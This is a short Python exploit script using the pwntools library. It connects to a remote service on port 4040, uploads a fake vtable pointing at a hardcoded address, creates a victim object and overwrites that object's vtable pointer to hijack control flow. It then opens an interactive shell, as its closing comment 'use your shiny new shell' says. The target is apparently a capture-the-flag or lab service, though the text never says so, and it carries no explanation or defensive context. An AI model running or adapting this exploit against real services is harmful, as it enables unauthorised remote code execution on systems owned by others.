#!/usr/bin/env python
import pwn
import sys
import struct

c = pwn.remote(sys.argv[1], 4040)

# post fake vtable
c.send("POST\n")
c.send("ZSTR\n")
c.send(b"AAAABBBB" + struct.pack("<I", 0x08048f00))
c.recvline()
ptr = c.recvline()

# create victim object
c.send("POST\n")
c.send("PSTR\n")
c.send("AAAA\n")
c.recvline()
victim = c.recvline()

# swap out the victim object's vtable
c.send("PUT\n")
c.send(victim)
c.send(struct.pack("<I", int(ptr)))

# use your shiny new shell
c.interactive()
